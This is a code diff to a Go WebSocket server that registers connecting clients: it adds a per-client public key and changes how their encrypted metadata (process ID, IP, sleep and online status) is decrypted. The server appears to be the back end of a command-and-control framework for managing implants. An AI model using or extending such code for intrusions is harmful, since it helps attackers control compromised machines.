@@ -10,6 +10,7 @@ import (
 	"BackendTemplate/pkg/qqwry"
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/webhooks"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"log"
@@ -342,7 +343,7 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err, "from:", r.RemoteAddr)
 				break
@@ -382,6 +383,8 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 					break
 				}
 
+				publicKey := metainfo[:32]
+				metainfo = metainfo[32:]
 				processID := binary.BigEndian.Uint32(metainfo[:4])
 				flag := int(metainfo[4])
 				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
@@ -442,6 +445,7 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 					Sleep:      "0",
 					Online:     "1",
 					Color:      "",
+					PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
 				}
 
 				// 插入数据库 - 使用事务保证一致性
@@ -527,7 +531,7 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err)
 				break
@@ -547,13 +551,13 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 				break
 			}
 
-			dataBytes, err = encrypt.Decrypt(dataBytes)
+			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
 			if err != nil {
 				logger.Error("First decrypt failed:", err)
 				break
 			}
 
-			dataBytes, err = encrypt.Decrypt(dataBytes)
+			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
 			if err != nil {
 				logger.Error("Second decrypt failed:", err)
 				break
@@ -793,7 +797,7 @@ WHERE uid = ? AND file_path = ?;
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("Decrypt failed:", err)
 				break
